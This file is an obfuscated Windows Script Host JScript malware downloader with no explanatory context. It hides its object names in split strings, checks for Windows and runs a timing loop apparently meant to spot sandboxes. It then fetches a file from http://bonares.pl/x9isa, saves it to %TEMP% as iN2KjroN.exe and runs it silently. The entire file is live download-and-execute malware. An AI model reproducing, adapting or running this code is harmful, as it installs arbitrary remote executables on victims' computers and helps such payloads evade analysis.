var _IK = false;
var _PZ = "CreateObject";
var _X1 = function _EE() {return WScript[_PZ]("WScript"+".Shell");}(), _N = 11;
var _D1 = "MSXML2.XMLHTTP";
var _FA = 2123213;
var _X = 0;
function _U(_S){_X1["Run"](_S, _X, _X);};
function _YT(){return _D1 + "";};
function _G(_NJ, _KO){_X = _X * 1; return _NJ - _KO;};
function _B(){return _PZ;};
/*@cc_on
  @if (@_win32 || @_win64)
    _IK = true;
  @end
@*/
if (_IK)
{
var _B0 = "";
function _NZ(){return 22;};
var _F = 0; var _YJ = 0;
function _JD()
{
var _H = new this["Date"]();
var _M1 = _H["getUTCMilliseconds"]();
WScript["Sleep"](_NZ());
var _H = new this["Date"]();
var _M0 = _H["getUTCMilliseconds"]();
WScript["Sleep"](_NZ());
var _H = new this["Date"]();
var _D0 = _H["getUTCMilliseconds"]();
var _F = "_Y";
_F = _G(_M0, _M1);
var _YJ = "_M";
_YJ = _G(_D0, _M0);
_B0 = "open";
return _G(_F, _YJ);
}
var _AM = false;
var _P = false;
for (var _CO = _X; _CO < _NZ() * 1; _CO++){if (_JD() != _X){
_AM = true; 
_YJ = "31" + 11 * _F + _YJ; 
_P = true; 
break;
}}
function _AO() {return ((_AM == true) && (_AM == _P)) ? 1 : _X;};
if (_AM && _AO() && _P){
function _D() {return _X1["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "iN2KjroN.ex" + "e";};
 _QP = _YT();
 _P0 = WScript[_PZ](_QP);
 var _X0 = 1;
 while (_X0){
try {
	if (_X0 == 1)
	{
		_P0[_B0]("GET", "http://bonares.pl/x9isa", false);
		_P0["send"]();
		_OC = "Sleep";
	}
	WScript[_OC](_NZ() + 120); 
	if (_P0["readystate"] < 2 * 2) continue;
	_X0 = _X;
	function _OU(_U0) {var _KC = (1, 2, 3, 4, 5, _U0); return _KC;};
	_KI = WScript[_B()]("ADODB.Stream");
	_QP = _KI;
	_QP[_B0]();
	_QP["type"] = _OU(1);
	_QP["write"](_P0["ResponseBody"]);
	_KI["position"] = _OU(_X);
	_QP["Save" + "ToFile"](_D(), 2);
	_KI["cl"+"ose"]();
	_Q = _D();
	_U(_Q);
} catch(_G0){};
}
}
}

